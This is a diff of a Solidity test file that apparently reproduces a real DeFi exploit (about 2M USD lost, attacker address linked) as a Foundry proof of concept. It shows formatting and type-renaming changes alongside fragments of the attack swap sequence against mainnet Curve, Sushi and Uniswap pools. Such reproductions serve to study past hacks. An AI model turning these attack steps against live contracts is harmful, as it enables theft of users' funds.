@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~2M USD$
 // Attacker : https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df
@@ -27,14 +26,9 @@ interface IUZD is IERC20 {
 
 interface ICurve {
 
-    function exchange(
-        uint256 i,
-        uint256 j,
-        uint256 dx,
-        uint256 min_dy,
-        bool use_eth,
-        address receiver
-    ) external returns (uint256);
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth, address receiver)
+        external
+        returns (uint256);
 
 }
 
@@ -54,9 +48,9 @@ contract ContractTest is Test {
     ICurvePool crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
     ICurvePool Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
     ICurve ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
-    Uni_Router_V2 sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
-    Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
-    Uni_Pair_V3 USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
+    IUniswapV2Router sushiRouter = IUniswapV2Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+    IUniswapV3Pair USDC_WETH_Pair = IUniswapV3Pair(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
+    IUniswapV3Pair USDC_USDT_Pair = IUniswapV3Pair(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     address MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;
 
@@ -155,7 +149,7 @@ contract ContractTest is Test {
         swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH
         swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT
 
-        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX
+        UZD_crvFRAX_POOL.exchange(0, 1, (UZD.balanceOf(address(this)) * 84) / 100, 0, address(this)); // swap UZD to crvFRAX
 
         crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD
 
